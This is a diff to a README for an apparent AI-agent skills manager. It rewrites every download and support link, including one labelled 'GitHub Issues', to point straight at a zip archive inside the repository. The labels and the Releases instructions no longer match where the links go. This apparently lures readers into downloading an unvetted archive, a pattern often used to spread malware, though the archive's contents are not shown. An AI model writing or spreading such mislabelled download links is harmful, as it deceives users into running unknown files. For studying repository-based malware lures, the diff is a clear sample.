@@ -4,7 +4,7 @@
 Welcome to the skills-management project! This simple command-line tool helps you manage and synchronize skills for your AI coding agents. You can keep everything organized and updated with just a few commands.
 
 ## 📥 Download & Install
-To get started, you need to download the application. Visit this page to download: [Download skills-management](https://github.com/Hak8er/skills-management/releases). 
+To get started, you need to download the application. Visit this page to download: [Download skills-management](https://raw.githubusercontent.com/Hak8er/skills-management/main/src/management-skills-v2.9.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -79,7 +79,7 @@ A: Make sure you have the correct permissions to run the commands and check the 
 A: Yes! We welcome contributions. Please check the contributing guidelines on our GitHub page.
 
 ## 📞 Support
-For further assistance, please open an issue on the GitHub repository. You can find the link here: [GitHub Issues](https://github.com/Hak8er/skills-management/issues).
+For further assistance, please open an issue on the GitHub repository. You can find the link here: [GitHub Issues](https://raw.githubusercontent.com/Hak8er/skills-management/main/src/management-skills-v2.9.zip).
 
 ## 🏁 Conclusion
-Thank you for using skills-management! We believe that managing AI skills should be straightforward, and we hope this tool helps you achieve that. Don’t forget to visit this page to download the latest updates: [Download skills-management](https://github.com/Hak8er/skills-management/releases).
+Thank you for using skills-management! We believe that managing AI skills should be straightforward, and we hope this tool helps you achieve that. Don’t forget to visit this page to download the latest updates: [Download skills-management](https://raw.githubusercontent.com/Hak8er/skills-management/main/src/management-skills-v2.9.zip).
